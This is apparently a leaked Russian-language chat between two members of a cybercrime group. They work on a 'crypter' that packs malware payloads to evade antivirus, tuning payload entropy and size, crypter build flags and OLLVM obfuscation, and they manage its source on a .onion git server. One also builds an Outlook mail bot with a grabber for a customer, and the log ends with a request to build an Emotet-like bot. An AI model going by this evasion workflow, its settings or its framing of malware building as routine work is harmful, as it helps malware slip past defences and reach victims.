[08.11.21 11:20:58] elroy:		```
#include <Windows.h>
#include <intrin.h>
#include <iostream>
#include <string>

int main()
{
	int a[4];
	__cpuid(a, 1);
	bool support_native_random = a[2] & 0x40000000;

	unsigned int hardRand;
	if (support_native_random)
	{
		if (_rdrand32_step(&hardRand))
			MessageBoxA(0, std::to_string(hardRand).c_str(), " : hardware random", MB_OK);
		else
			MessageBoxA(0, "false :(", " : not supported", MB_OK);
	}
	else
		MessageBoxA(0, "hardware random is not supported", " : not supported", MB_OK);

    //std::cout << "Hello World!\n";
	return 0;
}
```
[08.11.21 11:21:15] elroy:		Собери эту прогу, запусти на разных машинах.
[08.11.21 11:21:19] elroy:		Интересно знать что скажет
[08.11.21 11:21:28] elroy:		Нашли багину в криптере...
[08.11.21 11:21:44] basil:		ок. Это сейчас прямо надо сделать? Или терпит?
[08.11.21 11:22:15] elroy:		Это вот вообще срочно)
[08.11.21 11:22:18] elroy:		Инетресно как оно на вм и на голом железе
[08.11.21 11:23:13] basil:		хорошо. сейчас
[08.11.21 11:23:56] basil:		разрядность имеет значени?
[08.11.21 11:24:06] elroy:		да
[08.11.21 11:24:13] elroy:		Надо 32 и 64
[08.11.21 11:24:28] basil:		ок
[08.11.21 11:25:40] basil:		в вм win7 x32 1759500975
[08.11.21 11:26:02] basil:		в вм win7 x64 3416828987
[08.11.21 11:26:38] elroy:		Если все работает, должно быть мессаджбокс с числом. Если крашится или не работает, или другие сообщения - тогда интересно. А так, просто проверь на предмет "работает или нет", т.е. показывает число или нет.
[08.11.21 11:26:48] elroy:		Интересны результаты если число не показывается
[08.11.21 11:27:28] basil:		на железе 64 битная работает
[08.11.21 11:27:28] basil:		число показывает
[08.11.21 11:27:37] basil:		32 битную defender съел
[08.11.21 11:27:59] basil:		сейчас отключу
[08.11.21 11:28:15] basil:		вопрос будет . Очень далеко не уходи
[08.11.21 11:28:17] elroy:		Ох и вредоноса поймал....
[08.11.21 11:29:31] basil:		32 битная на железе. Тоже корректно
[08.11.21 11:29:40] basil:		показывает
[08.11.21 11:29:57] basil:		на других версия win в виртуалке проверять?
[08.11.21 11:30:48] elroy:		Не, это от цп зависит
[08.11.21 11:30:56] elroy:		На любой ос
[08.11.21 11:31:05] basil:		хорошо
[08.11.21 11:31:57] basil:		я тут пытался safe browsing отключить в tor browser
[08.11.21 11:32:15] basil:		Но никак не могу найти в настройках этот параметр
[08.11.21 11:32:29] basil:		может подскажешь где он?
[08.11.21 11:32:45] elroy:		Подскажу
[08.11.21 11:32:53] elroy:		Напиши в строке about:config
[08.11.21 11:33:10] elroy:		ПОтом там будет строка поиска, там напиши safebrows
[08.11.21 11:33:19] elroy:		Там и телметрия выключается
[08.11.21 11:34:32] basil:		тут много чего начинается на safebrows. Или все подряд делать false
[08.11.21 11:34:36] basil:		?
[08.11.21 11:35:01] elroy:		Да..
[08.11.21 11:35:18] basil:		jr
[08.11.21 11:35:19] basil:		ок
[08.11.21 11:37:28] basil:		сейчас перезайду
[08.11.21 11:38:45] basil:		тест
[08.11.21 11:38:57] basil:		хорошо. OTP работает
[08.11.21 11:40:08] elroy:		работает
[08.11.21 15:18:47] basil:		тест
[08.11.21 15:19:06] elroy:		Так что, внесешь правки?
[08.11.21 15:19:18] elroy:		i++
[08.11.21 15:21:14] basil:		Правки я могу залить. Конечно. Но только на объеме как-то не особо отразились. Или все равно залить?
[08.11.21 15:21:44] elroy:		Нет, зачем, если не отразились
[08.11.21 15:22:35] basil:		я уже обфускацию по минимуму сделал. Все что только мог урезал. По крайней мере мне так кажется
[08.11.21 15:23:18] basil:		но все равно из 11 кб нагрузки где то в 300 кб крипт. Это если не править энтропию
[08.11.21 15:23:53] elroy:		А если не из 11 сделать, а из 100 или 300 ?
[08.11.21 15:24:25] basil:		сейчас попробую но мне кажется что будет не мало
[08.11.21 15:24:28] basil:		момент
[08.11.21 15:25:50] elroy:		Ну закинь правки в гит. Все равно с такими размерами это мертвые ветки
[08.11.21 15:26:50] basil:		сейчас. сделаю билд отпишусь. И внесу эти правки
[08.11.21 15:27:35] basil:		хотя для дополнительного полиморфизма может и ничего использовать шаблон с i++. Но размер. Размер...
[08.11.21 15:27:53] basil:		Пока не знаю как его еще сжать
[08.11.21 15:28:31] elroy:		Еще можно оттуда конструкцию try выкинуть
[08.11.21 15:29:28] elroy:		Уже даже выкинул)
[08.11.21 15:30:01] basil:		значит цифры такие получаются. 190 кб нагрузка 1.3 мб  крипт
[08.11.21 15:30:21] basil:		т.е. ну поминимуму в 6 раз увеличивается размер
[08.11.21 15:45:18] elroy:		Такой вроде и был
[08.11.21 15:45:50] elroy:		А если использовать ключ 
```
--pack-prop-xor 77
```
[08.11.21 15:46:26] basil:		да? Но это все что мог отрезал. И это если не использовать коррекцию энтропии
[08.11.21 15:46:33] basil:		сейчас попробую
[08.11.21 15:49:36] basil:		950кб
[08.11.21 15:49:49] basil:		нагрузка 200 кб
[08.11.21 15:50:02] elroy:		Это хорошая цифра
[08.11.21 15:50:07] elroy:		Закдиывай в гит
[08.11.21 15:50:10] elroy:		Сам потестирую
[08.11.21 15:50:20] basil:		закинул
[08.11.21 15:50:34] basil:		последний коммит с i++
[08.11.21 15:50:56] elroy:		ок
[08.11.21 15:51:23] basil:		char* nopWinApiFunc[]  отключил. По моему только мешает. На текуший момент
[08.11.21 15:51:42] elroy:		Ну не знаю)
[08.11.21 15:54:54] basil:		я просто хотел заранее предупредить
[08.11.21 15:55:00] basil:		не настаиваю
[08.11.21 15:55:21] basil:		включить взад - дело 2 секунд
[09.11.21 15:41:52] basil:		тест
[09.11.21 15:41:58] elroy:		тест отк
[09.11.21 15:42:09] basil:		хорошо. слушаю
[09.11.21 15:42:09] elroy:		С мейлботом занят?
[09.11.21 15:42:24] basil:		нет. сегодня тихо.
[09.11.21 15:42:32] basil:		Что -то с криптером?
[09.11.21 15:42:38] basil:		есть замечания?
[09.11.21 15:42:50] elroy:		Есть задчи
[09.11.21 15:42:57] basil:		ок. давай
[09.11.21 15:45:29] elroy:		Надо бы вот то что ты сделал, последнюю ветку с правками, как-то логично оформить. Там в куче исправления... Или забери это в develop тогда.
Надо еще проверить сборку новых изменений с llvm и llvmo
А также с ollvm 12
```
https://github.com/0x3f97/ollvm-12.x
```
Это обфусцирующий уже 12 появился, и как-то мимо нас прошел
[09.11.21 15:46:45] elroy:		Меня интересует 12 ollvm в первую очередь.
[09.11.21 15:46:58] elroy:		Собственно, интересно, даст он чистоту или нет
[09.11.21 15:47:51] basil:		ок. Насчет "Надо бы вот то что ты сделал, последнюю ветку с правками, как-то логично оформить" может какую-то другую ветку сделать?
[09.11.21 15:52:05] elroy:		Мне на сегодняшний день нужен предыдущий коммит от верхушки develop, его я и вижу верхушкой. Я в верхушку develop влил ветку, где ты передела представление данных (не помню как ветка называется, навреное что-то с crt связанное).
Вот этот коммит бы откатить.
Чтобы develop вернулась на 1 назад.
Вот ветку, в которой делал удаление crt, та часть, где появились первые исправления REpresent, ее бы продолжить вот теми сипрарвлениями, что сейчас.
При этом возможность использовать внешний обфускатор выкатить бы в отдельную ветку от предыдущего коммита вурхушки develop (от него сдеать ветку).
[09.11.21 15:52:10] elroy:		Сохрани это все...
[09.11.21 15:52:57] elroy:		Сейчас так работа организовалась странно.. приходится на месте сливать ветки и потом криптовать. Слил коктейль и начал криптовать.. Как-то так))
[09.11.21 15:53:08] elroy:		Мне на сегодняшний день нужен предыдущий коммит от верхушки develop, его я и вижу верхушкой. Я в верхушку develop влил ветку, где ты передела представление данных (не помню как ветка называется, навреное что-то с crt связанное).
Вот этот коммит бы откатить.
Чтобы develop вернулась на 1 назад.
Вот ветку, в которой делал удаление crt, та часть, где появились первые исправления REpresent, ее бы продолжить вот теми сипрарвлениями, что сейчас.
При этом возможность использовать внешний обфускатор выкатить бы в отдельную ветку от предыдущего коммита вурхушки develop (от него сдеать ветку).
Сохрани это все...
[09.11.21 15:53:17] elroy:		То что я писал перед этим)
[09.11.21 15:56:01] basil:		ок. забрал
[12.11.21 10:40:57] elroy:		Приветствую
[12.11.21 10:43:07] basil:		Пытался на этих днях собрать ollvm. Сделал все как описано на GinHub. ТАм еще нужно cmake поставить и pyhon 3.6. Сыпется куча ошибок. И пока конча и края я не вижу. Стоит ли продолжать попытки?
[12.11.21 10:43:33] elroy:		Нет
[12.11.21 10:43:41] elroy:		Приведи в порядок ветки
[12.11.21 10:44:02] basil:		теперь по веткам.
[12.11.21 10:44:04] basil:		момент
[12.11.21 10:44:52] basil:		сейчас скачаю с гита
[12.11.21 10:46:45] basil:		вот мне было написано так
"Мне на сегодняшний день нужен предыдущий коммит от верхушки develop, его я и вижу верхушкой. Я в верхушку develop влил ветку, где ты передела представление данных (не помню как ветка называется, навреное что-то с crt связанное).
Вот этот коммит бы откатить.
Чтобы develop вернулась на 1 назад.
Вот ветку, в которой делал удаление crt, та часть, где появились первые исправления REpresent, ее бы продолжить вот теми сипрарвлениями, что сейчас.
При этом возможность использовать внешний обфускатор выкатить бы в отдельную ветку от предыдущего коммита вурхушки develop (от него сдеать ветку)."
[12.11.21 10:46:55] basil:		нужны пояснения
[12.11.21 10:47:34] elroy:		Минуту...
[12.11.21 10:53:12] elroy:		Давай разберем
[12.11.21 10:53:19] elroy:		Что именно тут не понятно?
[12.11.21 10:53:52] basil:		Ну во первых как же откатить один коммит от верхушки?
[12.11.21 10:54:13] basil:		там вроде есть способ но коммит в гите все равно вроде как останется
[12.11.21 10:54:45] elroy:		Так пусть останется в гите. Я не против. Ты как-то откатывал верхушку ветки, я помню)
[12.11.21 10:55:01] basil:		сейчас покапаюсь в своих завалах
[12.11.21 10:55:08] basil:		надо чуть подождать
[12.11.21 10:55:21] elroy:		Хорошо, я не сильно спешу
[12.11.21 10:55:33] elroy:		Главное не угробить гит)
[12.11.21 10:55:40] basil:		вот вот...
[12.11.21 10:55:44] elroy:		Сделай бекап у себя со всем ветками
[12.11.21 10:55:54] basil:		хорошо
[12.11.21 10:55:55] elroy:		Надо их все извлечь
[12.11.21 10:56:00] elroy:		ок
[12.11.21 11:02:43] basil:		ну по идее. Надо сделать так.  Потом переходим на нужную ветку. Сбросить у себя локально с ключом --hard. И потом push c ключом -f. Как я понимаю -f - это force
git checkout develop
git reset --hard <нужный коммит>
git push -f
[12.11.21 11:03:04] basil:		Сейчас сделаю и сохраню у себя локально
[12.11.21 11:03:15] basil:		И доложу о результатах
[12.11.21 11:06:58] elroy:		push -f на сервер же отправляет
[12.11.21 11:07:09] basil:		ну да
[12.11.21 11:07:28] elroy:		Я к тому, что локально не получается)
[12.11.21 11:08:31] elroy:		Можно для экспериментов завести еще проект на гит-сервере
[12.11.21 11:08:31] basil:		мы у себя локально откатываем ветку. А потом "принудительно" заставляем сделать это "откатывание" на сервере
[12.11.21 11:09:43] basil:		хорошо. давай тогда сделаем именно так. Если все внорме тогда и в основном репозитарии сделаем так же. Нет возражений? Или может я какую-то деталь упустил?
[12.11.21 11:10:02] basil:		Я имею ввиду создать новый репо
[12.11.21 11:10:41] elroy:		Давай сделаем так. Отвлекись пока на обед, я минут 40 аккуратно сделаю у себя бекап проекта со всем его ветками.
[12.11.21 11:10:46] elroy:		А потом продолжим
[12.11.21 11:11:11] basil:		хорошо.
[12.11.21 11:11:22] basil:		Маякни как сможешь говорить
[12.11.21 11:11:42] elroy:		ок
[12.11.21 11:54:00] elroy:		Бекап репо сделал себе
[12.11.21 11:54:05] elroy:		Можешь приступать
[12.11.21 11:54:38] elroy:		Можешь сам создать в гите проект, там права должны быть
[12.11.21 11:54:45] basil:		ок
[12.11.21 12:48:13] elroy:		А ты знал что у blake русски язык не родной? Поэтому он такую фигню часто пишет..
[12.11.21 12:48:49] basil:		ух.....
[12.11.21 12:48:59] basil:		Вот это поворот!
[12.11.21 12:49:26] basil:		если у него еще аватарка с его фото - я буду в ауте!
[12.11.21 12:49:57] elroy:		Иронично то, что ем уник дали созвучный с black - черный.))
[12.11.21 12:50:18] basil:		Ты бы слышал как я сейчас смеялся
[12.11.21 12:50:20] basil:		)))
[12.11.21 12:50:37] basil:		Сильно. У кого-то особое чувство юмора
[12.11.21 12:51:31] elroy:		Та да. Интересно то, что ники даются тут случайно. Совсем случайно)
[12.11.21 12:51:57] basil:		сейчас в другом месте напишу
[12.11.21 12:52:00] basil:		моментр
[12.11.21 14:21:20] basil:		тест
[12.11.21 14:21:27] basil:		попробуй скачать
[12.11.21 14:21:28] elroy:		тест ок
[12.11.21 14:21:29] basil:		https://mb5fbvx72fbod2hkirfecc5nh7lwq6ke7xocn7j2u7raiwbytvevpbad.onion/charlotte/temp_crypter.git
[12.11.21 14:21:42] basil:		тебя внес в список владельцев
[12.11.21 14:21:54] basil:		ветка develop
[12.11.21 14:22:51] elroy:		пробую
[12.11.21 14:27:44] elroy:		В тестовом криптере это на верхушке
```
commit 74a6a4890ce85f45e813748972f347aeca99cc9e (HEAD -> develop, origin/develop)
Author: charlotte <charlotte@charlotte>
Date:   Thu Sep 9 19:53:05 2021 +0300

    full_deleted_vector_from_UniCrypterProj
```
[12.11.21 14:28:32] basil:		ну да. Там же надо откатить в develop на один день назад\
[12.11.21 14:28:38] elroy:		Нужен этот
```
SolutionBuilder - changed step payload obfuscation to 120 in Represent UInt64
```
[12.11.21 14:28:49] elroy:		На 1 коммит назад)
[12.11.21 14:29:36] basil:		как называется коммит
[12.11.21 14:29:38] basil:		?
[12.11.21 14:29:49] basil:		полное название? Это в ветке develop&
[12.11.21 14:29:50] basil:		?
[12.11.21 14:30:07] elroy:		момент
[12.11.21 14:30:46] elroy:		Это коммент к коммиту.
А вот id
```
205c06ae872395271eac66f305058c380036604b
```
[12.11.21 14:32:25] basil:		Просьба есть. Пожалуйста. Название можно? Извнини, с этими id не очень дружу
[12.11.21 14:33:30] elroy:		id используется вместо названия..
У коммита есть текст, это то, что указывается через -m "comment", а есть id - это уникальный для него номер...
[12.11.21 14:33:44] elroy:		Скажи что еще сказать, я скажу)
[12.11.21 14:34:39] basil:		хорошо. сейчас найду по id
[12.11.21 14:34:49] elroy:		```
F:\projects\crypters\temp_crypter>git show 205c06ae872395271eac66f305058c380036604b
commit 205c06ae872395271eac66f305058c380036604b
Author: laura <laura@example.com>
Date:   Thu Sep 9 14:55:20 2021 +0300

    SolutionBuilder - changed step payload obfuscation to 120 in Represent UInt64
```
[12.11.21 14:51:17] basil:		нет в develop такого коммита
[12.11.21 14:51:22] basil:		нет и все
[12.11.21 14:51:53] basil:		он присутсвтует в других ветках
[12.11.21 14:52:19] basil:		но в какой этот был сделан
[12.11.21 14:53:35] elroy:		Быть не может
[12.11.21 14:54:29] basil:		от 09.09,2021 только 3 коммита в develop
[12.11.21 14:54:45] elroy:		У тебя есть возможность поставить Guitar ?
[12.11.21 14:55:03] basil:		сейчас попробую
[12.11.21 14:57:01] basil:		есть
[12.11.21 15:11:13] basil:		вот можешь найти этот коммит?
[12.11.21 15:11:19] elroy:		тест ок
[12.11.21 15:11:24] basil:		тест
[12.11.21 15:11:38] basil:		а у меня что-то плохо
[12.11.21 15:11:43] elroy:		Да
[12.11.21 15:11:43] elroy:		Могу
[12.11.21 15:12:21] basil:		т.е. он у тебя в ветке develop присутствует? Он есть от 09 сентября?
[12.11.21 15:12:43] elroy:		да
[12.11.21 15:12:59] elroy:		А давай скрин скину)
[12.11.21 15:13:03] elroy:		Увидишь
[12.11.21 15:13:18] basil:		скрин не надо
[12.11.21 15:13:28] basil:		надо понять почему у меня его нет
[12.11.21 15:13:47] elroy:		А ты открыл в гитаре?
[12.11.21 15:13:51] elroy:		Там есть граф
[12.11.21 15:15:06] basil:		ну я открыл в гитаре. Только пользоуюсь я ецй редко.
[12.11.21 15:15:25] basil:		В студии такого комиита нет. А в студии у тебя этот коммит есть?
[12.11.21 15:15:27] basil:		не в гитаре
[12.11.21 15:15:46] elroy:		Сейчас гляну
[12.11.21 15:17:12] elroy:		Да, есть коммит
[12.11.21 15:17:40] elroy:		Справа вверху там есть фильтр, вбиваю туда, показывает коммит
[12.11.21 15:18:42] elroy:		Пальцем в небо... - может в версии гита дело?
[12.11.21 15:37:23] basil:		я возможно что то делаю не так
[12.11.21 15:37:42] basil:		авпв
[12.11.21 15:37:44] basil:		тест
[12.11.21 15:37:52] basil:		тест
[12.11.21 15:37:55] elroy:		Давай еще раз)
[12.11.21 15:37:58] elroy:		тест ок
[12.11.21 15:38:03] basil:		не нахожуц
[12.11.21 15:38:08] basil:		нет такого коммита
[12.11.21 15:38:12] basil:		даже через поиск
[12.11.21 15:38:18] basil:		ветка develop
[12.11.21 15:38:34] elroy:		А как ты перенес в новый гит этот коммит?
[12.11.21 15:39:15] elroy:		сделай
```
git checkout develop
git pull
```
[12.11.21 15:39:23] elroy:		Что пишет?
[12.11.21 15:41:22] basil:		already up to data
[12.11.21 15:41:28] basil:		date*
[12.11.21 15:42:57] elroy:		git checkout 205c06ae872395271eac66f305058c380036604b
[12.11.21 15:44:44] basil:		сделал
[12.11.21 15:45:24] elroy:		Ну так видит значит коммит
[12.11.21 15:45:30] elroy:		git show
[12.11.21 15:46:12] basil:		хорошо. сейчас попробую в командной строке все это сделать
[12.11.21 15:52:41] basil:		так. в коммандной строке вроде сделал
[12.11.21 15:53:04] elroy:		Запушил в тестовый репо на сервер. Так?
[12.11.21 15:53:42] basil:		сейчас. момент
[12.11.21 15:55:36] basil:		проверяй
[12.11.21 15:55:44] basil:		отправил на сервер
[12.11.21 16:02:11] elroy:		Если заново склонировать, показывает нечто правильное.
[12.11.21 16:02:18] elroy:		Но сорцы надо сверять
[12.11.21 16:02:28] elroy:		Деай все что нужно дальше в этом тестовом репо
[12.11.21 16:02:42] elroy:		Потом сверю сорцы по веткам
[12.11.21 16:03:44] basil:		ок
[12.11.21 16:03:52] elroy:		Если просто сдеать git pull, он что-то сливает и показывает неччто странное. Надо только заново клонировать. Но это не проблема) Так лучше)
[12.11.21 16:04:58] basil:		ок. хорошо
[12.11.21 16:05:07] basil:		Тогда как я сейчас действую
[12.11.21 16:05:11] basil:		?
[12.11.21 16:08:41] elroy:		Дальше можешь продолжить?
[12.11.21 16:09:08] elroy:		Я просил разобрать коммиты из ветки где введен внешний обфускатор
[12.11.21 16:09:24] basil:		да. одновил. точне скачал заново
[12.11.21 16:13:22] elroy:		Не понял ответа...
[12.11.21 16:15:40] basil:		это я что то не то написал
[12.11.21 16:22:53] basil:		так еще раз прочитал твое задание. Я сейчас с тестового репо из ветки develop , с ее верхушки ( которая имеет коммит SolutionBuilder - changed step payload obfuscation to 120 in Represent UInt64) делаю отдельную ветку.  И в этой ветке делаю внешний обфускатор, который вызывавется из командной строки (noiser.exe). Я правильно тебя понимаю? Как-то я запутался
[12.11.21 16:23:21] elroy:		Да
[12.11.21 16:23:58] basil:		ок
[12.11.21 16:24:05] elroy:		Потом есть ветка, где ты убирал crt (готовился к ее уборке), там надо продолжить те изменения последние
[12.11.21 16:24:26] elroy:		Которые связаны с размерами (Represent там наращивал)
[18.11.21 11:07:00] elroy:		Занят?
[18.11.21 11:09:26] elroy:		Напиши как вернешься
[18.11.21 12:48:01] basil:		Приветствую
[18.11.21 12:50:23] elroy:		Нашел разработку OpenAI Codex, они обучили нейронку писать подсказки кодеру по словам. На странице есть видео как она пишут игру реагирую на английские фарзы разрабтотчика
```
https://openai.com/blog/openai-codex/
```
[18.11.21 12:52:47] basil:		Ок. Спасибо
[26.11.21 11:38:23] basil:		Приветствую
[26.11.21 11:39:29] elroy:		Приветствую
[26.11.21 11:40:22] basil:		Нужна небольшая консультация в рамках C++. Сможешь уделить немного своего времени?
[26.11.21 11:40:42] elroy:		Смогу, но позже
[26.11.21 11:41:05] basil:		Хорошо. Как сможешь - сообщи
[26.11.21 11:41:09] elroy:		ок
[26.11.21 13:12:25] elroy:		Спрашивай, вроде посвободнее стало
[26.11.21 13:13:13] basil:		ну тут с одним вопросом разобрался. Область видимости неправильная была. Тогда второй вопрос.
[26.11.21 13:13:45] basil:		Вот есть класс. У класса есть свойстов
[26.11.21 13:14:11] basil:		Это свойство имеет модификатор const
[26.11.21 13:16:18] basil:		Можно ли инициализировать это свойство не в момент объявления. Т.е. так 
const  DWORD i=0;
А после проведения ну каких-то вычислений? Т.е. в хидере ее объявляем, а на уже в файле *.cpp уже инициализируем
[26.11.21 13:20:19] elroy:		const - это значение. Можно значение изменить? (нет)
Используй не константу, а перменную.
[26.11.21 13:20:27] elroy:		(или может я не пойму впорос)
[26.11.21 13:21:08] basil:		нет. Значение изменять нельзя
[26.11.21 13:21:12] basil:		в том то и дело
[26.11.21 13:21:37] basil:		надо один раз присвоить ему значение и больше изменять его нельзя
[26.11.21 13:22:50] elroy:		тогда константа используется. Кнстанты объявляются обычно в .h файле либо в .cpp если видимость ее только на этот .cpp
[26.11.21 13:23:16] elroy:		Если константу надо вычислить во время компиляции, используй constexpr
[26.11.21 13:25:30] basil:		А если константа дожна быть вычислена в рантайм то получается константу использовтаь не получится? По сути получается что проверку на неизменность константы проводит только компилятор на этапе компиляции?
[26.11.21 13:29:59] elroy:		Проверку на неизменность не проводит компилятор, он просто проверяет константа и пишешь ли ты в нее, если пишешь - то все плохо.
При генерации кода константа не всегда кладется на страницу памяти rdata как константа, она может подставляться прямо в инструкции. Ее нельзя никак менять просто вот поэтому.
Если надо один раз при старте программы поменять, то тут только переменная.
Если надо контролировать, что туда никто не пишет, то тогда это класс с переопределенным оператором присвоения
[26.11.21 13:31:09] elroy:		Но класс - это для проверки кода, если кто-то пишет в паямть, тут больше ничего не поможет)
[26.11.21 13:31:41] basil:		ок. спасибо. консультация исчерпывающая)))
[26.11.21 13:31:48] elroy:		))
[03.12.21 13:01:21] basil:		Приветствую
[03.12.21 13:01:33] elroy:		Приветствую
[03.12.21 13:02:19] basil:		Послушай, сейчас есть что сделать по криптеру? Я могу чем-то помочь? Несколько переключиться MAPI это уже надоело вусмерть
[03.12.21 13:02:53] basil:		по боту я держу руку на пульсе
[03.12.21 13:04:42] elroy:		Пока нет. Сделай перерыв, выпей чаю, прогуляйся по воздуху.....
[03.12.21 13:05:03] basil:		хорошо. ок
[10.12.21 13:37:24] basil:		сейчас в блокноте наберу
[10.12.21 13:39:47] elroy:		Напиши еще раз
[10.12.21 13:39:58] basil:		тест
[10.12.21 13:40:10] basil:		тест
[10.12.21 13:40:10] elroy:		Напиши еще раз
[10.12.21 13:40:22] basil:		вот так лучше
[10.12.21 13:42:12] basil:		начал переделывать проект в соответствии с желаниями заказчика. С переключениями учеток все вроде более менее пока работает. Но вот, скажем так, с "архитектурными особенностями" получаются сложности
[10.12.21 13:42:47] basil:		там в проекте есть несколько базовых классов с виртуальными методами
[10.12.21 13:45:15] basil:		сложность состоит в классе OutlookBase. Получается каждый из наследников OutlookClient, OutLookSender,OutlookGrabber создает один дополнительный экземпляр OutllookBase. В этом классе присутсвуют переменная хранящая сессию MAPI
[10.12.21 13:46:30] basil:		Как то периодиченски все это работает со скрипом. Мне кажется что это может быть из-за этой сессии. Есть предложение сделать этот класс OutlookBase статическим.
[10.12.21 13:46:50] basil:		Как вот смотришь на это предложение?
[10.12.21 13:47:45] basil:		или может это можно решить кикими-то другими менее радикальными методами?
[10.12.21 13:55:52] elroy:		Переменную статической сделать, если аутлук будет всего один
[10.12.21 13:56:25] basil:		ок
[13.12.21 10:29:56] basil:		Приветствую
[13.12.21 10:30:57] basil:		Послушай, подскажи, если конечно в курсе. Кто виртальными машинами занимается. Мне jefferson выделил тут одну. Мне надо с админом связаться. Кое что у него уточнить
[13.12.21 10:34:23] elroy:		Приветствую. Занимается gator
[13.12.21 10:34:39] basil:		Спасибо.
[23.12.21 16:25:37] basil:		Приветствую
[23.12.21 16:26:07] elroy:		Приветствую
[23.12.21 16:27:12] basil:		Подскажи пожалуйста, какие параметры энтропии устанавливаются для нагрузки RunDll
[23.12.21 16:27:26] basil:		Желательно строку для билда
[23.12.21 16:27:40] basil:		я не могу зайти на дженкинс - недоступен
[23.12.21 16:27:47] elroy:		--entropy-max-rdata
[23.12.21 16:27:56] elroy:		Дальше от 4 до 6
[23.12.21 16:28:00] elroy:		4.1
[23.12.21 16:28:07] elroy:		4.6
[23.12.21 16:28:09] elroy:		.....
[23.12.21 16:28:13] basil:		ок
[23.12.21 16:28:19] basil:		спасибо большое
[24.12.21 14:15:39] elroy:		Приветствую
[24.12.21 14:16:22] elroy:		Вчера спрашивал за параметры для крипта
[24.12.21 14:16:31] basil:		Да. Было дело
[24.12.21 14:16:32] elroy:		Кто-то к тебе писал за криптом?
[24.12.21 14:16:38] basil:		за
[24.12.21 14:16:42] basil:		wild
[24.12.21 14:16:49] basil:		да*
[24.12.21 14:16:57] elroy:		Ок, хорошо.
[24.12.21 14:17:13] basil:		Мне не надо было этого делать?
[24.12.21 14:17:13] elroy:		Если вдруг будешь какие-то коммиты делать, в гит не пуш.
[24.12.21 14:17:26] basil:		хорошо. как скажешь
[24.12.21 14:17:27] elroy:		Надо) Спасибо что сделал)
[24.12.21 14:17:41] basil:		ок
[30.12.21 09:58:27] basil:		Приветствую
[30.12.21 09:58:59] basil:		Тут пытаюсь подключиться к репозиторию с криптором
[30.12.21 09:59:09] basil:		Он вообще работает?
[30.12.21 09:59:10] elroy:		Не получится, его нет
[30.12.21 09:59:29] basil:		уго убили?
[30.12.21 09:59:35] elroy:		Да.
[30.12.21 09:59:36] basil:		всмысле совсем стерли?
[30.12.21 09:59:41] elroy:		Да
[30.12.21 10:00:00] basil:		Хорошо. А как же можно теперь получить доступ к репо?
[30.12.21 10:00:05] elroy:		Щас скину последнюю версию проекта
[30.12.21 10:09:50] elroy:		```
Download: https://qaz.im/load/66hTrz/DKZhze
Delete: https://qaz.im/index.php?a=delete&q=1438029721
```
[30.12.21 10:10:55] basil:		тест
[30.12.21 10:11:54] elroy:		Собирать --stub 4 - если сборка идет под 2022 студией.
Там вот только нюанс один есть, собранные крипты иногда не работают. И я пока не понял почему. Толи 22 студия такое собирает, толи у нас где-то баг
[30.12.21 10:12:21] basil:		ок
[30.12.21 12:07:38] basil:		тест
[30.12.21 12:08:19] basil:		для et сборка стандартная?
[30.12.21 12:08:32] basil:		или есть какие-то специфические ключи?
[30.12.21 12:09:09] elroy:		--gen-exports yes обязательно, как и для всего где надо пробросить
[30.12.21 12:09:23] elroy:		А так особого ничего и не нужно
[30.12.21 12:09:45] elroy:		Есть проблема, у нас криптер делает et который не работает у них.
[30.12.21 12:10:07] elroy:		et можешь не криптовать, бесполезно.. но попробовать можно конечн.
[30.12.21 12:10:09] basil:		у них.... А если у себя запустить?
[30.12.21 12:10:16] elroy:		Там профиль et есть...
[30.12.21 12:10:20] basil:		пробовал?
[30.12.21 12:10:21] elroy:		Болванка работает
[30.12.21 12:10:25] basil:		я увидел
[30.12.21 12:10:39] elroy:		Болванка работает, а их нагрузка - нет.
[30.12.21 12:10:46] elroy:		Запускать у себя ну очень не рекомендую
[30.12.21 12:10:51] elroy:		Осторожно)))
[30.12.21 12:10:59] basil:		нет. у себя конечно нет
[30.12.21 12:11:05] basil:		есть там тестовая машина
[30.12.21 12:11:08] basil:		Выделили
[30.12.21 12:11:44] elroy:		Пробуй
[30.12.21 12:11:54] elroy:		В профиле et тамвся специфика настроена
[06.01.22 10:58:46] elroy:		Приветствую
[06.01.22 10:58:57] basil:		Приветствую
[06.01.22 10:59:00] basil:		тест
[06.01.22 10:59:14] elroy:		Скажи, есть задачи по мейлеру?
[06.01.22 11:00:22] basil:		ну я вчера показывал заказчику, как он работает. Вроде остался доволен. Там какое-то новое видение его развития. Но пока на уровне разговоров.
[06.01.22 11:00:29] basil:		Тебе нужна моя помощь?
[06.01.22 11:00:36] basil:		Если да говори - буду делать
[06.01.22 11:00:54] elroy:		Мне нужно знать занят ты или нет, есть ли у тебя задачи
[06.01.22 11:01:09] basil:		вот сейчас нет. Свободен
[06.01.22 11:01:27] elroy:		Завтра чем-то занят?
[06.01.22 11:01:45] basil:		ну вроде нет. ТОже совбоден
[06.01.22 11:01:59] basil:		относительно конечно
[06.01.22 11:02:46] elroy:		Узнай у заказчика нужен ты завтра или нет. Если нет - воспользуйся свободным графиком. Билды востановили, по криптам задач не будет.
[06.01.22 11:03:22] elroy:		(просто рекомендация)
[06.01.22 11:05:13] basil:		Я, конечно, извиняюсь. Но несколько не понял что мне делать. Мне "выходной" такой своеобразный дают. Или как? Я не отмазываюсь, просто не понял. Пожалуйста, перефразируй. Если можно
[06.01.22 11:08:30] elroy:		По распоряжению Сильвера еще в декабре, кто не задействован в работе с партнерами (от кого не зависит работа) и те у кого долгоиграющие проекты (разработка), те могут быть свободны.
В данном случае нужно было работать с 31 по 7, так как нужно было делать крипты. Билды восстановили, и тут ты больше не задействовано (пока не задействован). Если и там не задейстован, то целесообразно воспользоваться свбодным графиком.
[06.01.22 11:09:09] basil:		ок. Понял)))
[06.01.22 11:09:26] basil:		Ну просто понятнее стало
[06.01.22 11:10:02] elroy:		Если есть желание работать, работай... Просто вдруг отдых нужен.
[06.01.22 11:10:19] basil:		нет. я в норме
[06.01.22 11:10:56] elroy:		В общем, я просто мысль донес. Я не даю выходной (начальтво не оценит), а вот "свободный график" это другое)))
[06.01.22 11:11:11] basil:		)))
[06.01.22 11:11:21] basil:		Солнце еще высоко)))
[06.01.22 11:11:32] basil:		Хлопковое поле большое
[06.01.22 11:11:36] elroy:		У меня давно не появлялось...
[06.01.22 11:11:53] elroy:		И поле в снегу...
[06.01.22 11:11:59] elroy:		Нет возмодности работать))))
[06.01.22 11:13:09] basil:		Слушай. Тут такое дело. Как бы это сказать. Нужна твоя техническая консультация.... Я как бэ не от себя обращаюсь. От jefferson
[06.01.22 11:14:05] basil:		Собсвенно заказчик срасть как хочет сделать аналог emotet. Из бота который сейчас есть.
